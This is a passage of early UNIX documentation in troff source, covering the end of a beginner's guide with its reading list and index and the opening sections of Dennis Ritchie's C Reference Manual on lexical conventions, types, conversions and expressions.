The command
.C time
will give you the gross run-time statistics
of a program, but it's not super accurate or reproducible.
.PP
C programs that don't depend too much on special features of 
.UC UNIX
can be moved to the Honeywell 6070
and
.UC IBM
370 systems
with modest effort.
Read 
.ul 3
The
.UC GCOS
C Library
by M. E. Lesk and B. A. Barres for details.
.SH
Miscellany
.PP
If you 
.ul
have
to use Fortran,
you might consider
.C ratfor ,
which gives you the decent control structures
and free-form input that characterize C,
yet lets you write code that
is still portable to other environments.
Bear in mind that
.UC UNIX
Fortran
tends to produce large and relatively slow-running
programs.
Furthermore, supporting software like
.C db ,
.C prof ,
etc., are all virtually useless with Fortran programs.
.PP
If you want to use assembly language
(all heavens forfend!),
try the implementation language
.UC LIL,
which gives you many of the advantages of a high-level language,
like decent control flow structures,
but still lets you get close to the machine
if you really want to.
.PP
If your application requires you to translate
a language into a set of actions or another language,
you are in effect building a compiler,
though probably a small one.
In that case,
you should be using
the
.C yacc
compiler-compiler, 
which helps you develop a compiler quickly.
-- /usr/doc/beg/u5 mode=0100664 uid=3 gid=3 atime=170478237 mtime=173059622 --
.SH
.tr ~
V.~~UNIX READING LIST
.PP
.ti 0
.br
.I
General:
.R
.if t .sp 5p
.UC UNIX
Programmer's Manual
(Ken Thompson, Dennis Ritchie, and a cast of thousands).
Lists commands,
system routines and interfaces, file formats,
and some of the maintenance procedures.
You can't live without this,
although you will probably only read section I.
.if t .sp 5p
The
.UC UNIX
Time-sharing System
(Ken Thompson, Dennis Ritchie).
CACM, July 1974.
An overview of the system,
for people interested in operating systems.
Worth reading by anyone who programs.
Contains a remarkable number of one-sentence observations
on how to do things right.
.if t .sp 5p
.I
Document Preparation:
.R
.if t .sp 5p
A Tutorial Introduction to the
.UC UNIX
Text Editor.
(Brian Kernighan).
Bell Laboratories internal memorandum.
Weak on the more esoteric uses of the editor,
but still probably the easiest way to learn
.C ed .
.if t .sp 5p
Typing Documents on
.UC UNIX.
(Mike Lesk).
Bell Laboratories internal memorandum.
A macro package to isolate the novice
from the vagaries of the formatting programs.
If this specific package isn't available on your system,
something similar probably is.
This one works with both
.C nroff
and
.C troff .
.if t .sp 5p
.I
Programming:
.R
.if t .sp 5p
Programming in C: A Tutorial
(Brian Kernighan).
Bell Laboratories internal memorandum.
The easiest way to start learning C,
but it's no help at all with the interface to the system
beyond the simplest IO.
Should be read in conjunction with
.if t .sp 5p
C Reference Manual
(Dennis Ritchie).
Bell Laboratories internal memorandum.
An excellent reference,
but a bit heavy going for the beginner,
especially one who has never used a language like C.
.if t .sp 5p
.I
Others:
.R
.if t .sp 5p
D. M. Ritchie,
UNIX Assembler Reference Manual.
.sp 2p
B. W. Kernighan and L. L. Cherry,
A System for Typesetting Mathematics,
Computing Science Tech. Rep. 17.
.sp 2p
M. E. Lesk and B. A. Barres,
The GCOS C Library.
Bell Laboratories internal memorandum.
.sp 2p
K. Thompson and D. M. Ritchie,
Setting Up UNIX.
.sp 2p
M. D. McIlroy,
UNIX
Summary.
.sp 2p
D. M. Ritchie,
The UNIX I/O System.
.sp 2p
A. D. Hall,
The M6 Macro Processor,
Computing Science Tech. Rep. 2.
.sp 2p
J. F. Ossanna,
NROFF User's Manual _ Second Edition,
Bell Laboratories internal memorandum.
.sp 2p
D. M. Ritchie and K. Thompson,
Regenerating System Software.
.sp 2p
B. W. Kernighan,
Ratfor_A Rational Fortran,
Bell Laboratories internal memorandum.
.sp 2p
M. D. McIlroy,
Synthetic English Speech by Rule,
Computing Science Tech. Rep. 14.
.sp 2p
M. D. McIlroy,
Bell Laboratories internal memorandum.
.sp 2p
J. F. Ossanna,
TROFF Users' Manual,
Bell Laboratories internal memorandum.
.sp 2p
B. W. Kernighan,
TROFF Made Trivial,
Bell Laboratories internal memorandum.
.sp 2p
R. H. Morris and L. L. Cherry,
Computer Detection of Typographical Errors,
Computing Science Tech. Rep. 18.
.sp 2p
S. C. Johnson,
YACC (Yet Another Compiler-Compiler),
Bell Laboratories internal memorandum.
.sp 2p
P. J. Plauger,
Programming in LIL: A Tutorial,
Bell Laboratories internal memorandum.
-- /usr/doc/beg/u6 mode=0100664 uid=3 gid=3 atime=170478207 mtime=173059622 --
.sp 3
.SH Index
Index
.LP
.sp 2
.nf
& (asynchronous process)  8
; (multiple processes)  8
* (pattern match)  5
[ ] (pattern match)  6
? (pattern match)  6
<> (redirect I/O)  7
>> (file append)  12
backslash (\\)  2
cat (concatenate files)  4
cdb (C debugger)  12
chdir (change directory)  7
chmod (change protection)  7
command arguments  4
command files  8
cp (copy files)  5
cref (cross reference)  11
date  2
db (assembly debugger)  13
delete (DEL)  2
diff (file comparison)  11
directories  7
document formatting  9
ed (editor)  3
editor programming  11
EOT (end of file)  3
eqn (mathematics)  11
erase character (#)  2
file system structure  6
filenames  5
file protection  7
goto  12
grep (pattern matching)  11
if (condition test)  12
index  14
kill a program  8
kill a character (@)  2
lil (high-level assembler)  13
login  1
logout  2
ls (list file names)  4
macro for formatting  10
mail  2
multi-columns printing (pr)  5
mv (move files)  5
nroff  9
on-line manual  3
opr (offline print)  5
pathname  6
pattern match in filenames  5
pipes ( | )  8
pr (print files)  4
prof (run-time monitor)  13
protection  7
ptx (permuted index)  11
pwd (working directory)  7
quotes  6
ratfor (decent Fortran)  13
readahead  2
reading list  13
redirect I/O (<>)  7
RETURN key  1
rm (remove files)  5
rmdir (remove directory)  7
roff (text formatting)  9
root (of file system)  6
shell (command interpreter)  8
shell arguments ($)  12
shell programming  12
shift (shell arguments)  12
sleep  12
sort  11
spell (find spelling mistakes)
stopping a program  2
stty (set terminal options)  2
tabs (set tab stops)  2
terminal types  1
time (time programs)  13
tr (translate characters)  11
troff (typesetting)  9
typo (find spelling mistakes)  11
wc (word count)  11
who (who is looged in)  2
write (to a user)  3
yacc (compiler-compiler)  13
-- /usr/doc/c mode=0140775 uid=3 gid=3 atime=173059628 mtime=173059507 --
-- /usr/doc/c/c0 mode=0100664 uid=3 gid=3 atime=170478270 mtime=173059629 --
.fp 3 G
.tr ^\|
.hc $
.tr @
.br
.po 0
.tl '-'''
.po
.pl 11i
.ll 6.5i
.ps 18
.vs 18p
.sp 1.4i
.ce
C Reference Manual
.sp 2
.ps 10
.vs 11p
.ce 3
.ft I
Dennis M. Ritchie
.sp .25
Bell Telephone Laboratories
Murray Hill, New Jersey 07974
.ps 10
.ft R
.vs 11p
.sp 3
.de pg
.sp .4
.ti 1
..
.de et
.sp .2
.ft R
.ti 1
..
.de dp
.sp .7
.ne \\$1
.ft I
.nf
..
.de ed
.fi
.sp .7
.ft R
..
.de ul
.sp 1.5
.ne 4
.ft G
..
.de ms
.sp  1
.ne 4
..
.de fo
'bp
..
.de he
.po 0
.tl '-'''
.po
'sp 0.5i
.ft I
.if o .tl '''C  Reference  Manual - %'
.if e .tl 'C  Reference  Manual - %'''
.ft
'sp 0.4i
..
.de bG
.br
.ft G
..
.de eG
.br
.ft R
..
.de it
.ft I
\\$1
.ft R
..
.de bd
.ft G
\\$1
.ft R
..
.wh -1i fo
.wh 0 he
.ds op \s6\d\fIopt\fP\u\s10
.ds * \fR\v'.2'*\fP\v'-.2'
.ds ~ \v'.5'\s14~\s10\v'-.5'
-- /usr/doc/c/c1 mode=0110664 uid=3 gid=3 atime=170478270 mtime=173059629 --
.ta .5i 1i 1.5i 2i 2.5i 3i 3.5i 4i
.ul
1.  Introduction
.et
C is a computer language based on the earlier language B [1].
The languages and their compilers differ in two
major ways:
C introduces the notion of types, and defines
appropriate extra syntax and semantics;
also, C on the \s8PDP\s10-11 is a true compiler, producing
machine code where B produced interpretive code.
.pg
Most of the software for the \s8UNIX\s10 time-sharing system [2]
is written in C, as is the operating system itself.
C is also available on the \s8HIS\s10 6070 computer
at Murray Hill and
and on the \s8IBM\s10 System/370
at Holmdel [3].
This paper is a manual only for the C language itself
as implemented on the \s8PDP\s10-11.
However, hints are given occasionally in the text of
implementation-dependent features.
.pg
The \s8UNIX\s10 Programmer's Manual [4]
describes the library routines available to C programs under \s8UNIX\s10,
and also the procedures for compiling programs under that
system.
``The \s8GCOS\s10 C Library'' by Lesk and Barres [5]
describes routines available under that system
as well as compilation procedures.
Many of these routines, particularly the ones having to do with I/O,
are also provided under \s8UNIX\s10.
Finally, ``Programming in C\(mi A Tutorial,''
by B. W. Kernighan [6],
is as useful as promised by its title and the author's
previous introductions to allegedly impenetrable subjects.
.ul
2.  Lexical conventions
.et
There are six kinds of
tokens:
identifiers, keywords, constants, strings, expression operators,
and other separators.
In general blanks, tabs, newlines,
and comments as described below
are ignored except as they serve to separate
tokens.
At least one of these characters is required to separate
otherwise adjacent identifiers,
constants, and certain operator-pairs.
.pg
If the input stream has been parsed into tokens
up to a given character, the next token is taken
to include the longest string of characters
which could possibly constitute a token.
.ms
2.1  Comments
.et
The characters ^^\fG/\**\fR^^ introduce a comment, which terminates
with the characters^^ \fG\**/\fR.
.ms
2.2  Identifiers (Names)
.et
An identifier is a sequence of letters and digits;
the first character must be alphabetic.
The underscore ``\(ru'' counts as alphabetic.
Upper and lower case letters
are considered different.
No more than the first eight characters
are significant, and only the first seven for
external identifiers.
.ms
2.3  Keywords
.et
The following identifiers are reserved for use
as keywords, and may not be used otherwise:
.sp .7
.in .5i
.ta 2i
.nf
.ne 10
.ft G
int	break
char	continue
float	if
double	else
struct	for
auto	do
extern	while
register	switch
static	case
goto	default
return	entry
sizeof
.sp .7
.ft R
.fi
.in 0
The
.bd entry
keyword is not currently implemented by any compiler but
is reserved for future use.
.ms
2.3  Constants
.et
There are several kinds
of constants, as follows:
.ms
2.3.1  Integer constants
.et
An integer constant is a sequence of digits.
An integer is taken
to be octal if it begins with \fG0\fR, decimal otherwise.
The digits \fG8\fR and \fG9\fR have octal value 10 and 11 respectively.
.ms
2.3.2  Character constants
.et
A character constant is 1 or 2 characters enclosed in single quotes
``\fG^\(aa^\fR''.
Within a character constant a single quote must be preceded by
a back-slash ``\\''.
Certain non-graphic characters, and ``\\'' itself,
may be escaped according to the following table:
.sp .7
.ta .5i 1.25i
.nf
	\s8BS\s10	\\b
	\s8NL\s10	\\n
	\s8CR\s10	\\r
	\s8HT\s10	\\t
	\fIddd\fR	\\\fIddd\fR
	\\	\\\\
.fi
.sp .7
The escape ``\\\fIddd\fR''
consists of the backslash followed by 1, 2, or 3 octal digits
which are taken to specify the value of the
desired character.
A special case of this construction is ``\\0'' (not followed
by a digit) which indicates a null character.
.pg
Character constants behave exactly like integers
(not, in particular, like objects
of character type).
In conformity with the addressing structure of the \s8PDP\s10-11,
a character constant of length 1 has the code for the
given character in the low-order byte
and 0 in the high-order byte;
a character constant of length 2 has the code for the
first character in the low byte and that for the second
character in the high-order byte.
Character constants with more than one character are
inherently machine-dependent and should
be avoided.
.ms
2.3.3  Floating constants
.et
A floating constant consists of
an integer part, a decimal point, a fraction part,
an \fGe\fR, and an optionally signed integer exponent.
The integer and fraction parts both consist of a sequence
of digits.
Either the integer part or the fraction
part (not both) may be missing;
either the decimal point or
the \fGe\fR and the exponent (not both) may be missing.
Every floating constant is taken to be double-precision.
.ms
2.4  Strings
.et
A string is a sequence of characters surrounded by
double quotes ``^\fG"\fR^''.
A string has the type
array-of-characters (see below)
and refers to an area of storage initialized with
the given characters.
The compiler places
a null byte (^\\0^)
at the end of each string so that programs
which scan the string can
find its end.
In a string, the character ``^\fG"\fR^'' must be preceded by
a ``\\''^;
in addition, the same escapes as described for character
constants may be used.
.ul
3.  Syntax notation
.et
In the syntax notation used in this manual,
syntactic categories are indicated by
\fIitalic\fR type,
and literal words and characters
in \fGgothic.\fR
Alternatives are listed on separate lines.
An optional terminal or non-terminal symbol is
indicated by the subscript ``opt,'' so that
.dp
	{ expression\*(op }
.ed
would indicate an optional expression in braces.
.ul
4.  What's in a Name?
.et
C bases the interpretation of an
identifier upon two attributes of the identifier: its
.ft I
storage class
.ft R
and its
.ft I
type.
.ft R
The storage class determines the location and lifetime
of the storage associated with an identifier;
the type determines
the meaning of the values
found in the identifier's storage.
.pg
There are four declarable storage classes:
automatic,
static,
external,
and
register.
Automatic variables are local to each invocation of
a function, and are discarded on return;
static variables are local to a function, but retain
their values independently of invocations of the
function; external variables are independent of any function.
Register variables are stored in the fast registers
of the machine; like automatic
variables they are local to each function and disappear on return.
.pg
C supports four fundamental types of objects:
characters, integers, single-, and double-precision
floating-point numbers.
.sp .7
.in .5i
Characters (declared, and hereinafter called, \fGchar\fR) are chosen from
the \s8ASCII\s10 set;
they occupy the right-most seven bits
of an 8-bit byte.
It is also possible to interpret \fGchar\fRs
as signed, 2's complement 8-bit numbers.
.sp .4
Integers (\fGint\fR) are represented in 16-bit 2's complement notation.
.sp .4
Single precision floating point (\fGfloat\fR) quantities
have magnitude in the range approximately
10\u\s7\(+-38\s10\d
or 0; their precision is 24 bits or about
seven decimal digits.
.sp .4
Double-precision floating-point (\fGdouble\fR) quantities have the same range
as \fGfloat\fRs and a precision of 56 bits
or about 17 decimal digits.
.sp .7
.in 0
.pg
Besides the four fundamental types there is a
conceptually infinite class of derived types constructed
from the fundamental types in the following ways:
.sp .7
.in .5i
.ft I
arrays
.ft R
of objects of most types;
.sp .4
.ft I
functions
.ft R
which return objects of a given type;
.sp .4
.ft I
pointers
.ft R
to objects of a given type;
.sp .4
.ft I
structures
.ft R
containing objects of various types.
.sp .7
.in 0
In general these methods
of constructing objects can
be applied recursively.
.ul
5.  Objects and lvalues
.et
An object is a manipulatable region of storage;
an lvalue is an expression referring to an object.
An obvious example of an lvalue
expression is an identifier.
There are operators which yield lvalues:
for example,
if E is an expression of pointer type, then \**E is an lvalue
expression referring to the object to which E points.
The name ``lvalue'' comes from the assignment expression
``E1@=@E2'' in which the left operand E1 must be
an lvalue expression.
The discussion of each operator
below indicates whether it expects lvalue operands and whether it
yields an lvalue.
.ul
6.  Conversions
.et
A number of operators may, depending on their operands,
cause conversion of the value of an operand from one type to another.
This section explains the result to be expected from such
conversions.
.ms
6.1  Characters and integers
.et
A \fGchar\fR object may be used anywhere
an \fGint\fR may be.
In all cases the
\fGchar\fR is converted to an \fGint\fR
by propagating its sign through the
upper 8 bits of the resultant integer.
This is consistent with the two's complement representation
used for both characters and integers.
(However,
the sign-propagation feature
disappears in other implementations.)
.ms
6.2  Float and double
.et
All floating arithmetic in C is carried out in double-precision;
whenever a \fGfloat\fR
appears in an expression it is lengthened to \fGdouble\fR
by zero-padding its fraction.
When a \fGdouble\fR must be
converted to \fGfloat\fR, for example by an assignment,
the \fGdouble\fR is rounded before
truncation to \fGfloat\fR length.
.ms
6.3  Float and double; integer and character
.et
All \fGint\fRs and \fGchar\fRs may be converted without
loss of significance to \fGfloat\fR or \fGdouble\fR.
Conversion of \fGfloat\fR or \fGdouble\fR
to \fGint\fR or \fGchar\fR takes place with truncation towards 0.
Erroneous results can be expected if the magnitude
of the result exceeds 32,767 (for \fGint\fR)
or 127 (for \fGchar\fR).
.ms
6.4  Pointers and integers
.et
Integers and pointers may be added and compared; in such a case
the \fGint\fR is converted as
specified in the discussion of the addition operator.
.pg
Two pointers to objects of the same type may be subtracted;
in this case the result is converted to an integer
as specified in the discussion of the subtraction
operator.
-- /usr/doc/c/c2 mode=0110664 uid=3 gid=3 atime=170478272 mtime=173059629 --
.ul
7.  Expressions
.et
The precedence of expression operators is the same
as the order of the major
subsections of this section (highest precedence first).
Thus the expressions referred to as the operands of \fG+\fR
(\(sc7.4)
are those expressions defined in \(sc\(sc7.1_7.3.
Within each subsection, the operators have the same
precedence.
Left- or right-associativity is specified
in each subsection for the operators
discussed therein.
The precedence and associativity of all the expression
operators is summarized in an
appendix.
.pg
Otherwise the order of evaluation of expressions
is undefined.  In particular the compiler
considers itself free to
compute subexpressions in the order it believes
most efficient,
even if the subexpressions
involve side effects.
.ms
7.1  Primary expressions
.et
Primary expressions
involving \fG.\fR^, \fG\(mi>\fR, subscripting, and function calls
group left to right.
.ms
7.1.1  \fIidentifier\fR
.et
An identifier is a primary expression, provided it has been
suitably declared as discussed below.
Its type is specified by its declaration.
However, if the type of the identifier is ``array of .^.^.'',
then the value of the identifier-expression
is a pointer
to the first object in the array, and the
type of the expression is
``pointer to .^.^.''.
Moreover, an array identifier is not an lvalue
expression.
.pg
Likewise, an identifier which is declared
``function returning .^.^.'',
when used except in the function-name position
of a call, is converted to ``pointer to function returning .^.^.''.
.ms
7.1.2  \fIconstant\fR
.et
A decimal, octal, character, or floating
constant is a primary expression.
Its type is \fGint\fR in the first three cases,
\fGdouble\fR in the last.
.ms
7.1.3  \fIstring\fR
.et
A string is a primary expression.
Its type is originally ``array of \fGchar\fR''; but following
the same rule as in \(sc7.1.1 for identifiers,
this is modified to ``pointer to \fGchar\fR'' and the
result is a pointer to the first character
in the string.
.ms
7.1.4  \fG(\fI expression \fG)\fR
.et
A parenthesized expression is a primary expression
whose type and value are identical
to those of the unadorned expression.
The presence of parentheses does
not affect whether the expression is an
lvalue.
.ms
7.1.5  \fIprimary-expression\fG [\fI expression \fG]\fR
.et
A primary expression followed by an expression in square
brackets is a primary expression.
The intuitive meaning is that of a subscript.
Usually, the primary expression has type ``pointer to .^.^.'',
the subscript expression is \fGint\fR,
and the type of the result is ``^.^.^.^''.
The expression ``E1[E2]'' is
identical (by definition) to ``\**^(^^(^E1^)^+^(^E2^)^^)^''.
All the clues
needed to understand
this notation are contained in this section together
with the discussions
in \(sc\(sc 7.1.1, 7.2.1, and 7.4.1 on identifiers,
\fG\**\fR, and \fG+\fR respectively;
\(sc14.3 below summarizes the implications.
.ms
7.1.6  \fIprimary-expression \fG( \fIexpression-list\*(op \fG)
.et
A function call is a primary expression followed by parentheses
containing a possibly
empty, comma-separated list of expressions
which constitute the actual arguments to the
function.
The primary expression must be of type ``function returning .^.^.'',
and the result of the function call is of type ``^.^.^.^''.
As indicated
below, a hitherto unseen identifier followed
immediately by a left parenthesis
is contextually declared
to represent a function returning
an integer;
thus in the most common case, integer-valued functions
need not be declared.
.pg
Any actual arguments of type \fGfloat\fR are
converted to \fGdouble\fR before the call;
any of type \fGchar\fR are converted to \fGint\fR.
.pg
In preparing for the call to a function,
a copy is made of each actual parameter;
thus, all argument-passing in C is strictly by value.
A function may
change the values of its formal parameters, but
these changes cannot possibly affect the values
of the actual parameters.
On the other hand, it is perfectly possible
to pass a pointer on the understanding
that the function may change the value
of the object to which the pointer points.
.pg
Recursive calls to any
function are permissible.
.ms
7.1.7  \fIprimary-lvalue \fG.\fI member-of-structure\fR
.et
An lvalue expression followed by a dot followed by the name
of a member of a structure is a primary expression.
The object referred to
by the lvalue is assumed to have the
same form as the structure
containing the structure member.
The result of the expression is an lvalue appropriately
offset from the origin of the given lvalue
whose type is that of the
named structure member.
The given lvalue is not required to have
any particular type.
.pg
Structures are discussed in \(sc8.5.
.ms
7.1.8  \fIprimary-expression \fG\(mi>\fI member-of-structure\fR
.et
The primary-expression is assumed to be a pointer
which points to an object of the same form
as the structure of which the member-of-structure is
a part.
The result is an lvalue appropriately
offset from the origin of the pointed-to structure
whose type is that of the named structure member.
The type of the primary-expression need not
in fact be pointer; it is sufficient that
it be a pointer, character, or integer.
.pg
Except for the relaxation of the requirement that
E1 be of pointer type, the expression ``E1\(mi>MOS''
is exactly equivalent to ``(\**E1).MOS''.
.ms
7.2  Unary operators
.et
Expressions with unary operators
group right-to-left.
.ms
7.2.1  \fG\**\fI expression\fR
.et
The unary \fG\**\fR operator
means
.ft I
indirection:
.ft R
the expression must be a pointer, and the result
is an lvalue referring to the object to
which the expression points.
If the type of the expression is ``pointer to .^.^.'',
the type of the result is ``^.^.^.^''.
.ms
7.2.2  \fG&\fI lvalue-expression\fR
.et
The result of the unary \fG&\fR operator is a pointer
to the object referred to by the
lvalue-expression.
If the type of the lvalue-expression is ``^.^.^.^'',
the type of the result is ``pointer to .^.^.''.
.ms
7.2.3  \fG\(mi\fI expression\fR
.et
The result is the negative of the expression,
and has the same type.
The type of the expression must be \fGchar\fR, \fGint\fR, \fGfloat\fR,
or \fGdouble\fR.
.ms
7.2.4  \fG!\fI expression\fR
.et
The result of the logical negation operator \fG!\fR
is 1 if the value of the expression is 0, 0 if the value of the
expression is non-zero.
The type of the result is \fGint\fR.
This operator is applicable only to \fGint\fRs or \fGchar\fRs.
.ms
7.2.5  \fG\*~\fI expression\fR
.et
The \*~ operator yields the one's complement of its operand.
The type of the expression must be \fGint\fR or \fGchar\fR,
and the result is \fGint\fR.
.ms
7.2.6  ++ \fIlvalue-expression\fR
.et
The object referred to by the lvalue expression
is incremented.
The value is the new value of the lvalue expression
and the type is the type of the lvalue.
If the expression is \fGint\fR or \fGchar\fR,
it is incremented by 1;
if it is a pointer to an object, it is incremented
by the length of the object.
++ is applicable only to these types.
(Not, for example, to \fGfloat\fR or \fGdouble\fR.)
.ms
7.2.7  \fR\(mi\(mi\fI lvalue-expression\fR
.et
The object referred to by the lvalue expression is decremented
analogously to the ++ operator.
.ms
7.2.8  \fIlvalue-expression ++
.et
The result is the value of the object
referred to by the lvalue expression.
After the result is noted, the object
referred to by the lvalue is incremented in the same
manner as for the prefix ++ operator: by 1 for an \fGint\fR
or \fGchar\fR, by the length of the pointed-to object for a pointer.
The type of the result is the same as the
type of the lvalue-expression.
.ms
7.2.9  \fIlvalue-expression \(mi\(mi
.et
The result of the expression is the value of the object
referred to by the
the lvalue expression.
After the result is noted, the object referred
to by the lvalue expression is decremented in a way
analogous to the postfix ++ operator.
.ms
7.2.10  \fGsizeof \fIexpression
.et
The \fGsizeof\fR operator yields the size,
in bytes, of its operand.
When applied to an array, the result is the total
number of bytes in the array.
The size is determined from
the declarations of
the objects in the expression.
This expression is semantically an integer constant and may
be used anywhere a constant is required.
Its major use is in communication with routines
like storage allocators and I/O systems.
.ms
7.3  Multiplicative operators
.et
The multiplicative operators
\fG\**\fR, \fG/\fR, and \fG%\fR
group left-to-right.
.ms
7.3.1  \fIexpression\fG \** \fIexpression\fR
.et
The binary \fG\**\fR operator indicates multiplication.
If both operands are \fGint\fR or \fGchar\fR, the result
is \fGint\fR; if one is \fGint\fR or \fGchar\fR and one \fGfloat\fR or \fGdouble\fR, the
former is converted to \fGdouble\fR, and the result is \fGdouble\fR;
if both are \fGfloat\fR or \fGdouble\fR, the result is \fGdouble\fR.
No other combinations are allowed.
.ms
7.3.2  \fIexpression \fG/\fI expression\fR
.et
The binary \fG/\fR operator indicates division.
The same type considerations as for multiplication
apply.
.ms
7.3.3  \fIexpression \fG%\fI expression\fR
.et
The binary \fG%\fR operator yields the remainder
from the division of the first expression by the second.
Both operands must be \fGint\fR or \fGchar\fR, and the
result is \fGint\fR.
In the current implementation,
the remainder has the same sign as the dividend.
.ms
7.4  Additive operators
.et
The additive operators \fG+\fR and \fG\(mi\fR group left-to-right.
.ms
7.4.1  \fIexpression \fG+\fI expression\fR
.et
The result is the sum of the expressions.
If both operands are \fGint\fR or \fGchar\fR,
the result is \fGint\fR.
If both
are \fGfloat\fR or \fGdouble\fR, the result is \fGdouble\fR.
If one is \fGchar\fR or \fGint\fR and one is \fGfloat\fR
or \fGdouble\fR, the former is converted to \fGdouble\fR and the result is \fGdouble\fR.
If an \fGint\fR or \fGchar\fR is added to a pointer, the former
is converted by multiplying it
by the length of the object to which the
pointer points and the result is a pointer
of the same type as the original pointer.
Thus if P is a pointer
to an object, the expression ``P+1'' is a pointer
to another object of the same type as
the first and immediately following
it in storage.
.pg
No other type combinations are allowed.
.ms
7.4.2  \fIexpression \fG\(mi \fIexpression\fR
.et
The result is the difference of the operands.
If both operands are \fGint\fR, \fGchar\fR, \fGfloat\fR, or \fGdouble\fR,
the same type considerations
as for \fG+\fR apply.
If an \fGint\fR or \fGchar\fR is subtracted
from a pointer, the
former is converted in the same way as explained under
\fG+\fR above.
.pg
If two pointers to objects of the same type are subtracted,
the result is converted
(by division by the length of the object)
to an \fGint\fR representing the number of
objects separating
the pointed-to objects.
This conversion will in general give unexpected
results unless the pointers point
to objects in the same array, since pointers, even
to objects of the same type, do not necessarily differ
by a multiple of the object-length.
.ms
7.5  Shift operators
.et
The shift operators \fG<<\fR and \fG>>\fR group left-to-right.
.ms
7.5.1  \fIexpression \fG<< \fIexpression\fR
.br
7.5.2  \fIexpression \fG>> \fIexpression\fR
.et
Both operands must be \fGint\fR or \fGchar\fR,
and the result is \fGint\fR.
The second operand should
be non-negative.
The value of ``E1<<E2'' is E1 (interpreted as a bit
pattern 16 bits long) left-shifted E2 bits;
vacated bits are 0-filled.
The value of ``E1>>E2'' is E1 (interpreted as a two's
complement, 16-bit quantity) arithmetically
right-shifted E2 bit positions.
Vacated bits are filled by a copy of the sign bit of E1.
[Note: the use
of arithmetic rather than logical shift does not
survive transportation between machines.]
.ms
7.6  Relational operators
.et
The relational operators group left-to-right, but
this fact is not very useful; ``a<b<c'' does
not mean what it seems to.
.ms
7.6.1  \fIexpression \fG<\fI expression\fR
.br
.ne 4
7.6.2  \fIexpression \fG>\fI expression\fR
.br
.ne 4
7.6.3  \fIexpression \fG<=\fI expression\fR
.br
.ne 4
7.6.4  \fIexpression \fG>=\fI expression\fR
.et
The operators < (less than), > (greater than), <= (less than
or equal to) and >= (greater than or equal to)
all yield 0 if the specified relation is false
and 1 if it is true.
Operand conversion is exactly the same as for the \fG+\fR
operator except that pointers of any kind may be compared;
the result in this case depends on the relative
locations in storage of the pointed-to objects.
It does not seem to be very mean$ing$ful
to compare pointers with integers
other than 0.
.ms
.ti 0
7.7  Equality operators
.et
.ne 4
.ti 0
7.7.1  \fIexpression \fG==\fI expression\fR
.br
.ne 4
7.7.2  \fIexpression \fG!=\fI expression\fR
.et
The \fG==\fR (equal to) and the \fG!=\fR (not equal to) operators
are exactly analogous to the relational
operators except for their lower
precedence.
(Thus ``a<b@==@c<d'' is 1 whenever
a<b and c<d
have the same truth-value).
.ms
7.8  \fIexpression \fG&\fI expression\fR
.et
The \fG&\fR operator groups left-to-right.
Both operands must be \fGint\fR or \fGchar\fR;
the result is an \fGint\fR which is the bit-wise
logical \fGand\fR function of the operands.
.ms
.tr ^^
7.9  \fIexpression \fG^ \fIexpression\fR
.et
The \fG^\fR operator groups left-to-right.
The operands must be \fGint\fR or \fGchar\fR; the result is an \fGint\fR
which is the bit-wise exclusive \fGor\fR function of
its operands.
.tr ^\|
.ms
7.10  \fIexpression ^\(or \fIexpression\fR
.et
The \(or operator groups left-to-right.
The operands must be \fGint\fR or \fGchar\fR; the result is an \fGint\fR
which is the bit-wise inclusive \fGor\fR of its operands.
.ms
7.11  \fIexpression \fG&&\fI expression
.et
The \fG&&\fR operator returns 1 if both its operands
are non-zero, 0 otherwise.
Unlike \fG&\fR, \fG&&\fR guarantees left-to-right
evaluation; moreover the second operand is not evaluated
if the first operand is 0.
.pg
The operands need not have the same type, but each
must have one of the fundamental
types or be a pointer.
.ms
7.12  \fIexpression ^\(or\(or \fIexpression
.et
The ^\(or\(or operator returns 1 if either of its operands
is non-zero, and 0 otherwise.
Unlike ^\(or^,
^\(or\(or guarantees left-to-right evaluation; moreover,
the second operand is not evaluated
if the value of the first operand is non-zero.
.pg
The operands need not have the same type, but each
must
have one of the fundamental types
or be a pointer.
.ms
7.13  \fIexpression \fG? \fIexpression \fG:\fI expression\fR
.et
Conditional expressions group left-to-right.
The first expression is evaluated
and if it is non-zero, the result is the value of the
second expression, otherwise that of third expression.
If the types of the second and third operand are the same, the
result has their common type;
otherwise the same conversion rules as for \fG+\fR
apply.
Only one of the second and third
expressions is evaluated.
.ms
7.14  Assignment operators
.et
There are a number of assignment operators,
all of which group right-to-left.
All require an lvalue as their left operand,
and the type of an assignment expression is that
of its left operand.
The value is the value stored in the
left operand after the assignment has taken place.
.ms
7.14.1  \fIlvalue \fG= \fIexpression\fR
.et
The value of the expression replaces that of the object
referred
to by the lvalue.
The operands need not have the same type, but
both must be
\fGint\fR, \fGchar\fR, \fGfloat\fR, \fGdouble\fR,
or pointer.
If neither operand is a pointer,
the assignment takes place as expected, possibly
preceded by conversion of the expression on the right.
.pg
When both operands are \fGint\fR
or pointers of any kind, no conversion
ever takes place;
the value of the expression is simply stored
into the object referred to by the lvalue.
Thus it is possible to
generate pointers which will cause addressing
exceptions when used.
.ms
.ta \w'0.00.00 'u
7.14.2	\fIlvalue \fG=+ \fIexpression\fR
.br
7.14.3	\fIlvalue \fG=\(mi \fIexpression\fR
.br
7.14.4	\fIlvalue \fG=\** \fIexpression\fR
.br
7.14.5	\fIlvalue \fG=/ \fIexpression\fR
.br
7.14.6	\fIlvalue \fG=% \fIexpression\fR
.br
7.14.7	\fIlvalue \fG=>> \fIexpression\fR
.br
7.14.8	\fIlvalue \fG=<< \fIexpression\fR
.br
7.14.9	\fIlvalue \fG=& \fIexpression\fR
.br
.tr ^^
7.14.10	\fIlvalue \fG=^ \fIexpression\fR
.br
.tr ^\|
7.14.11	\fIlvalue \fG=^\(or \fIexpression\fR
.et
The behavior of an expression
of the form ``E1@=op@E2'' may be inferred by
taking it as equivalent to ``E1@=@E1@op@E2'';
however, E1 is evaluated only once.
Moreover,
expressions like ``i@=+@p''
in which a pointer is added to an integer, are forbidden.
.ms
7.15  \fIexpression \fG,\fI expression\fR
.et
A pair of expressions separated by a comma is evaluated
left-to-right and the value of the left expression is
discarded.
The type and value of the result are the
type and value of the right operand.
This operator groups left-to-right.
It should be avoided in situations where comma is given
a special meaning, for example in actual arguments
to function calls (\(sc7.1.6) and lists of initializers (\(sc10.2).
-- /usr/doc/c/c3 mode=0110664 uid=3 gid=3 atime=170478273 mtime=173059629 --
.ta  .5i 1i 1.5i 2i 2.5i 3i
.ul
8.  Declarations
.et
Declarations are used within function definitions to specify the interpretation
which C gives to each identifier; they do not necessarily
reserve storage associated with the identifier.
Declarations have the form
.dp 2
	declaration:
		decl-specifiers declarator-list\*(op  \fG;
.ed
